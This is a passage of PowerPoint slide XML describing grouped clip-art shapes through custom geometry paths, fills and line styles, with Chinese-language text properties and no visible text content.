                  <a:gd name="T3" fmla="*/ 1 h 108"/>
                  <a:gd name="T4" fmla="*/ 1 w 120"/>
                  <a:gd name="T5" fmla="*/ 1 h 108"/>
                  <a:gd name="T6" fmla="*/ 1 w 120"/>
                  <a:gd name="T7" fmla="*/ 1 h 108"/>
                  <a:gd name="T8" fmla="*/ 1 w 120"/>
                  <a:gd name="T9" fmla="*/ 0 h 108"/>
                  <a:gd name="T10" fmla="*/ 1 w 120"/>
                  <a:gd name="T11" fmla="*/ 0 h 108"/>
                  <a:gd name="T12" fmla="*/ 1 w 120"/>
                  <a:gd name="T13" fmla="*/ 1 h 108"/>
                  <a:gd name="T14" fmla="*/ 1 w 120"/>
                  <a:gd name="T15" fmla="*/ 1 h 108"/>
                  <a:gd name="T16" fmla="*/ 1 w 120"/>
                  <a:gd name="T17" fmla="*/ 1 h 108"/>
                  <a:gd name="T18" fmla="*/ 1 w 120"/>
                  <a:gd name="T19" fmla="*/ 1 h 108"/>
                  <a:gd name="T20" fmla="*/ 1 w 120"/>
                  <a:gd name="T21" fmla="*/ 1 h 108"/>
                  <a:gd name="T22" fmla="*/ 1 w 120"/>
                  <a:gd name="T23" fmla="*/ 1 h 108"/>
                  <a:gd name="T24" fmla="*/ 1 w 120"/>
                  <a:gd name="T25" fmla="*/ 1 h 108"/>
                  <a:gd name="T26" fmla="*/ 1 w 120"/>
                  <a:gd name="T27" fmla="*/ 1 h 108"/>
                  <a:gd name="T28" fmla="*/ 1 w 120"/>
                  <a:gd name="T29" fmla="*/ 1 h 108"/>
                  <a:gd name="T30" fmla="*/ 1 w 120"/>
                  <a:gd name="T31" fmla="*/ 1 h 108"/>
                  <a:gd name="T32" fmla="*/ 1 w 120"/>
                  <a:gd name="T33" fmla="*/ 1 h 108"/>
                  <a:gd name="T34" fmla="*/ 1 w 120"/>
                  <a:gd name="T35" fmla="*/ 1 h 108"/>
                  <a:gd name="T36" fmla="*/ 0 w 120"/>
                  <a:gd name="T37" fmla="*/ 1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0"/>
                  <a:gd name="T58" fmla="*/ 0 h 108"/>
                  <a:gd name="T59" fmla="*/ 120 w 120"/>
                  <a:gd name="T60" fmla="*/ 108 h 10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0" h="108">
                    <a:moveTo>
                      <a:pt x="0" y="53"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="3" y="34"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="15" y="19"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="30" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="71" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="105" y="19"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="117" y="34"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="120" y="53"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="117" y="72"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="105" y="89"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="102"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="71" y="108"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="108"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="30" y="102"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="15" y="89"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="72"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0"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未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="181" y="179"/>
                <a:ext cx="19" cy="17"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 28"/>
                  <a:gd name="T1" fmla="*/ 1 h 26"/>
                  <a:gd name="T2" fmla="*/ 1 w 28"/>
                  <a:gd name="T3" fmla="*/ 1 h 26"/>
                  <a:gd name="T4" fmla="*/ 1 w 28"/>
                  <a:gd name="T5" fmla="*/ 0 h 26"/>
                  <a:gd name="T6" fmla="*/ 1 w 28"/>
                  <a:gd name="T7" fmla="*/ 0 h 26"/>
                  <a:gd name="T8" fmla="*/ 1 w 28"/>
                  <a:gd name="T9" fmla="*/ 1 h 26"/>
                  <a:gd name="T10" fmla="*/ 1 w 28"/>
                  <a:gd name="T11" fmla="*/ 1 h 26"/>
                  <a:gd name="T12" fmla="*/ 1 w 28"/>
                  <a:gd name="T13" fmla="*/ 1 h 26"/>
                  <a:gd name="T14" fmla="*/ 1 w 28"/>
                  <a:gd name="T15" fmla="*/ 1 h 26"/>
                  <a:gd name="T16" fmla="*/ 1 w 28"/>
                  <a:gd name="T17" fmla="*/ 1 h 26"/>
                  <a:gd name="T18" fmla="*/ 1 w 28"/>
                  <a:gd name="T19" fmla="*/ 1 h 26"/>
                  <a:gd name="T20" fmla="*/ 0 w 28"/>
                  <a:gd name="T21" fmla="*/ 1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
                  <a:gd name="T34" fmla="*/ 0 h 26"/>
                  <a:gd name="T35" fmla="*/ 28 w 28"/>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 h="26">
                    <a:moveTo>
                      <a:pt x="0" y="13"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="2" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="9" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="19" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="26" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="28" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="26" y="20"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="19" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="9" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2" y="2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未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="177" y="200"/>
                <a:ext cx="27" cy="40"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 1 w 40"/>
                  <a:gd name="T1" fmla="*/ 0 h 60"/>
                  <a:gd name="T2" fmla="*/ 1 w 40"/>
                  <a:gd name="T3" fmla="*/ 1 h 60"/>
                  <a:gd name="T4" fmla="*/ 1 w 40"/>
                  <a:gd name="T5" fmla="*/ 1 h 60"/>
                  <a:gd name="T6" fmla="*/ 1 w 40"/>
                  <a:gd name="T7" fmla="*/ 1 h 60"/>
                  <a:gd name="T8" fmla="*/ 0 w 40"/>
                  <a:gd name="T9" fmla="*/ 1 h 60"/>
                  <a:gd name="T10" fmla="*/ 0 w 40"/>
                  <a:gd name="T11" fmla="*/ 1 h 60"/>
                  <a:gd name="T12" fmla="*/ 1 w 40"/>
                  <a:gd name="T13" fmla="*/ 1 h 60"/>
                  <a:gd name="T14" fmla="*/ 1 w 40"/>
                  <a:gd name="T15" fmla="*/ 1 h 60"/>
                  <a:gd name="T16" fmla="*/ 1 w 40"/>
                  <a:gd name="T17" fmla="*/ 1 h 60"/>
                  <a:gd name="T18" fmla="*/ 1 w 40"/>
                  <a:gd name="T19" fmla="*/ 0 h 60"/>
                  <a:gd name="T20" fmla="*/ 1 w 40"/>
                  <a:gd name="T21" fmla="*/ 0 h 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
                  <a:gd name="T34" fmla="*/ 0 h 60"/>
                  <a:gd name="T35" fmla="*/ 40 w 40"/>
                  <a:gd name="T36" fmla="*/ 60 h 6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 h="60">
                    <a:moveTo>
                      <a:pt x="36" y="0"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="36" y="57"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="40" y="57"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="40" y="60"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="60"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="57"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="6" y="57"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="6" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="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未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="163" y="0"/>
                <a:ext cx="57" cy="53"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 86"/>
                  <a:gd name="T1" fmla="*/ 1 h 80"/>
                  <a:gd name="T2" fmla="*/ 1 w 86"/>
                  <a:gd name="T3" fmla="*/ 1 h 80"/>
                  <a:gd name="T4" fmla="*/ 1 w 86"/>
                  <a:gd name="T5" fmla="*/ 1 h 80"/>
                  <a:gd name="T6" fmla="*/ 1 w 86"/>
                  <a:gd name="T7" fmla="*/ 1 h 80"/>
                  <a:gd name="T8" fmla="*/ 1 w 86"/>
                  <a:gd name="T9" fmla="*/ 0 h 80"/>
                  <a:gd name="T10" fmla="*/ 1 w 86"/>
                  <a:gd name="T11" fmla="*/ 1 h 80"/>
                  <a:gd name="T12" fmla="*/ 1 w 86"/>
                  <a:gd name="T13" fmla="*/ 1 h 80"/>
                  <a:gd name="T14" fmla="*/ 1 w 86"/>
                  <a:gd name="T15" fmla="*/ 1 h 80"/>
                  <a:gd name="T16" fmla="*/ 1 w 86"/>
                  <a:gd name="T17" fmla="*/ 1 h 80"/>
                  <a:gd name="T18" fmla="*/ 1 w 86"/>
                  <a:gd name="T19" fmla="*/ 1 h 80"/>
                  <a:gd name="T20" fmla="*/ 1 w 86"/>
                  <a:gd name="T21" fmla="*/ 1 h 80"/>
                  <a:gd name="T22" fmla="*/ 1 w 86"/>
                  <a:gd name="T23" fmla="*/ 1 h 80"/>
                  <a:gd name="T24" fmla="*/ 1 w 86"/>
                  <a:gd name="T25" fmla="*/ 1 h 80"/>
                  <a:gd name="T26" fmla="*/ 1 w 86"/>
                  <a:gd name="T27" fmla="*/ 1 h 80"/>
                  <a:gd name="T28" fmla="*/ 1 w 86"/>
                  <a:gd name="T29" fmla="*/ 1 h 80"/>
                  <a:gd name="T30" fmla="*/ 1 w 86"/>
                  <a:gd name="T31" fmla="*/ 1 h 80"/>
                  <a:gd name="T32" fmla="*/ 0 w 86"/>
                  <a:gd name="T33" fmla="*/ 1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6"/>
                  <a:gd name="T52" fmla="*/ 0 h 80"/>
                  <a:gd name="T53" fmla="*/ 86 w 86"/>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6" h="80">
                    <a:moveTo>
                      <a:pt x="0" y="40"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="4" y="25"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="27" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="44" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="61" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="75" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="84" y="25"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="86" y="40"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="84" y="55"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="75" y="68"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="61" y="76"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="44" y="80"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="27" y="76"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="68"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="55"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="40"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:schemeClr val="folHlink"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="68" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="162" y="30"/>
                <a:ext cx="24" cy="12"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 36"/>
                  <a:gd name="T1" fmla="*/ 1 h 19"/>
                  <a:gd name="T2" fmla="*/ 1 w 36"/>
                  <a:gd name="T3" fmla="*/ 1 h 19"/>
                  <a:gd name="T4" fmla="*/ 1 w 36"/>
                  <a:gd name="T5" fmla="*/ 1 h 19"/>
                  <a:gd name="T6" fmla="*/ 1 w 36"/>
                  <a:gd name="T7" fmla="*/ 0 h 19"/>
                  <a:gd name="T8" fmla="*/ 0 w 36"/>
                  <a:gd name="T9" fmla="*/ 1 h 19"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 36"/>
                  <a:gd name="T16" fmla="*/ 0 h 19"/>
                  <a:gd name="T17" fmla="*/ 36 w 36"/>
                  <a:gd name="T18" fmla="*/ 19 h 19"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="36" h="19">
                    <a:moveTo>
                      <a:pt x="0" y="2"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="36" y="19"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36" y="17"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="2"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="69" name="Rectangle 137"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="184" y="38"/>
                <a:ext cx="12" cy="5"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:blipFill dpi="0" rotWithShape="0">
                <a:blip r:embed="rId2" cstate="print"/>
                <a:srcRect/>
                <a:tile tx="0" ty="0" sx="100000" sy="100000" flip="none" algn="tl"/>
              </a:blipFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:miter lim="800000"/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="70" name="Rectangle 138"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="158" y="17"/>
                <a:ext cx="5" cy="20"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:miter lim="800000"/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="162" name="组合 161"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1782192" y="4649391"/>
            <a:ext cx="5221288" cy="958069"/>
            <a:chOff x="1782192" y="4649391"/>
            <a:chExt cx="5221288" cy="958069"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="8" name="Line 38"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5387404" y="5313773"/>
              <a:ext cx="14287" cy="29368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7" name="Group 69"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="3793553" y="5132739"/>
              <a:ext cx="606425" cy="446087"/>
              <a:chOff x="0" y="0"/>
              <a:chExt cx="382" cy="281"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="92" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="237" y="113"/>
                <a:ext cx="126" cy="80"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 1 w 190"/>
                  <a:gd name="T1" fmla="*/ 1 h 121"/>
                  <a:gd name="T2" fmla="*/ 0 w 190"/>
                  <a:gd name="T3" fmla="*/ 0 h 121"/>
                  <a:gd name="T4" fmla="*/ 1 w 190"/>
                  <a:gd name="T5" fmla="*/ 1 h 121"/>
                  <a:gd name="T6" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T7" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T8" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T9" fmla="*/ 0 w 190"/>
                  <a:gd name="T10" fmla="*/ 0 h 121"/>
                  <a:gd name="T11" fmla="*/ 190 w 190"/>
                  <a:gd name="T12" fmla="*/ 121 h 121"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T6">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T7">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T8">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T9" t="T10" r="T11" b="T12"/>
                <a:pathLst>
                  <a:path w="190" h="121">
                    <a:moveTo>
                      <a:pt x="17" y="121"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="0" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="190" y="81"/>
                    </a:lnTo>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:noFill/>
              <a:ln w="3175">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 name="Rectangle 71"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="262" y="219"/>
                <a:ext cx="69" cy="62"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:miter lim="800000"/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="94" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="262" y="187"/>
                <a:ext cx="102" cy="32"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 154"/>
                  <a:gd name="T1" fmla="*/ 1 h 48"/>
                  <a:gd name="T2" fmla="*/ 1 w 154"/>
                  <a:gd name="T3" fmla="*/ 0 h 48"/>
                  <a:gd name="T4" fmla="*/ 1 w 154"/>
                  <a:gd name="T5" fmla="*/ 0 h 48"/>
                  <a:gd name="T6" fmla="*/ 1 w 154"/>
                  <a:gd name="T7" fmla="*/ 1 h 48"/>
                  <a:gd name="T8" fmla="*/ 0 w 154"/>
                  <a:gd name="T9" fmla="*/ 1 h 48"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 154"/>
                  <a:gd name="T16" fmla="*/ 0 h 48"/>
                  <a:gd name="T17" fmla="*/ 154 w 154"/>
                  <a:gd name="T18" fmla="*/ 48 h 48"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="154" h="48">
                    <a:moveTo>
                      <a:pt x="0" y="48"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="52" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="154" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="104" y="48"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="48"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="808080"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="95" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="331" y="187"/>
                <a:ext cx="33" cy="94"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 50"/>
                  <a:gd name="T1" fmla="*/ 1 h 142"/>
                  <a:gd name="T2" fmla="*/ 1 w 50"/>
                  <a:gd name="T3" fmla="*/ 1 h 142"/>
                  <a:gd name="T4" fmla="*/ 1 w 50"/>
                  <a:gd name="T5" fmla="*/ 0 h 142"/>
                  <a:gd name="T6" fmla="*/ 0 w 50"/>
                  <a:gd name="T7" fmla="*/ 1 h 142"/>
                  <a:gd name="T8" fmla="*/ 0 w 50"/>
                  <a:gd name="T9" fmla="*/ 1 h 142"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 50"/>
                  <a:gd name="T16" fmla="*/ 0 h 142"/>
                  <a:gd name="T17" fmla="*/ 50 w 50"/>
                  <a:gd name="T18" fmla="*/ 142 h 142"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="50" h="142">
                    <a:moveTo>
                      <a:pt x="0" y="142"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="50" y="95"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="50" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="48"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="142"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="808080"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="96" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="331" y="180"/>
                <a:ext cx="51" cy="39"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 77"/>
                  <a:gd name="T1" fmla="*/ 1 h 59"/>
                  <a:gd name="T2" fmla="*/ 1 w 77"/>
                  <a:gd name="T3" fmla="*/ 1 h 59"/>
                  <a:gd name="T4" fmla="*/ 1 w 77"/>
                  <a:gd name="T5" fmla="*/ 0 h 59"/>
                  <a:gd name="T6" fmla="*/ 1 w 77"/>
                  <a:gd name="T7" fmla="*/ 1 h 59"/>
                  <a:gd name="T8" fmla="*/ 0 w 77"/>
                  <a:gd name="T9" fmla="*/ 1 h 59"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
